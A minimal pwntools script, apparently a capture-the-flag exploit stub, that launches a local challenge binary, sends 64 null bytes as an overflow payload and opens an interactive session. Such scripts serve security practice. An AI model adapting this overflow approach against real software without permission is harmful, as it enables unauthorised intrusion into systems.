from pwn import *
r = process("./chall")

payload = "\x00"*64
r.sendline(payload)
r.interactive()